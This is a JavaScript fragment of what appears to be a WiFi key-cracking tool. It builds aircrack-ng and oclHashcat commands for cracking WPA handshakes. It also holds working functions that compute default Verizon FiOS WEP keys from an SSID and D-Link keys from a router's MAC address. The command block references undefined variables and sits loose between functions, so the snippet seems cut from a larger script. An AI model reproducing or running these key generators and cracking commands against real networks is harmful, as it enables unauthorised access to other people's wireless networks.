function add1(c) { c = c.toUpperCase(); return c=="0"?"1":c=="1"?"2":c=="2"?"3":c=="3"?"4":c=="4"?"5":c=="5"?"6":c=="6"?"7":c=="7"?"8":c=="8"?"9":c=="9"?"A":c=="A"?"B":c=="B"?"C":c=="C"?"D":c=="D"?"E":c=="E"?"F":c=="F"?"0":c; }

 // commands
 document.getElementById('ac').value = "aircrack-ng -a 2 -b " + document.getElementById('mac').value.toUpperCase().trim() + " -w wordlist.txt capture.cap";
 document.getElementById('upper').value = "oclHashcat64.exe -m 2500 -a3 capture.hccap -1 \"" + keymask1.split("").sort().toString().replace(/,/g,"") + "\" ?1?1?1?1?1?1?1?1";
 document.getElementById('lower').value = "oclHashcat64.exe -m 2500 -a3 capture.hccap -1 \"" + keymask2.split("").sort().toString().replace(/,/g,"") + "\" ?1?1?1?1?1?1?1?1";

function verizon_fios_wep_keygen(ssid) {
 ssid = ssid.toUpperCase().trim();
 var d1, d2, d3, d4, d5;
 d1 = ssid.substr(0,1); d1 = (d1.charCodeAt(0) >= 65) ? (d1.charCodeAt(0) - 55) : Number(d1); d1 = d1 * 1;
 d2 = ssid.substr(1,1); d2 = (d2.charCodeAt(0) >= 65) ? (d2.charCodeAt(0) - 55) : Number(d2); d2 = d2 * 36;
 d3 = ssid.substr(2,1); d3 = (d3.charCodeAt(0) >= 65) ? (d3.charCodeAt(0) - 55) : Number(d3); d3 = d3 * 1296;
 d4 = ssid.substr(3,1); d4 = (d4.charCodeAt(0) >= 65) ? (d4.charCodeAt(0) - 55) : Number(d4); d4 = d4 * 46656;
 d5 = ssid.substr(4,1); d5 = (d5.charCodeAt(0) >= 65) ? (d5.charCodeAt(0) - 55) : Number(d5); d5 = d5 * 1679616;
 return "1801"+(d1+d2+d3+d4+d5).toString(16).toUpperCase() + "\n" + "1F90"+(d1+d2+d3+d4+d5).toString(16).toUpperCase();
}
function dlink_keygen(mac) {
 mac = mac.toUpperCase().replace(/:/g,"").trim();
 var mac_chars = [];
 mac_chars[0] = mac.charAt(11); mac_chars[1] = mac.charAt(0); mac_chars[2] = mac.charAt(10); mac_chars[3] = mac.charAt(1);
 mac_chars[4] = mac.charAt(9); mac_chars[5] = mac.charAt(2); mac_chars[6] = mac.charAt(8); mac_chars[7] = mac.charAt(3);
 mac_chars[8] = mac.charAt(7); mac_chars[9] = mac.charAt(4); mac_chars[10] = mac.charAt(6); mac_chars[11] = mac.charAt(5);
 mac_chars[12] = mac.charAt(1); mac_chars[13] = mac.charAt(6); mac_chars[14] = mac.charAt(8); mac_chars[15] = mac.charAt(9);
 mac_chars[16] = mac.charAt(11); mac_chars[17] = mac.charAt(2); mac_chars[18] = mac.charAt(4); mac_chars[19] = mac.charAt(10);
 var key = [];
 var hash = ['X','r','q','a','H','N','p','d','S','Y','w','8','6','2','1','5'];
 var index = 0; 
 for (var i=0; i<20; i++) { 
  if((mac_chars[i] >= '0') && (mac_chars[i] <= '9')) { index = mac_chars[i] - '0'; }
  else if((mac_chars[i] >= 'A') && (mac_chars[i] <= 'F')) { index = mac_chars[i] - 'A' + 10; }
  key[i] = hash[index]; 
 }
 return key[0]+key[1]+key[2]+key[3]+key[4]+key[5]+key[6]+key[7]+key[8]+key[9]+key[10]+key[11]+key[12]+key[13]+key[14]+key[15]+key[16]+key[17]+key[18]+key[19];
}
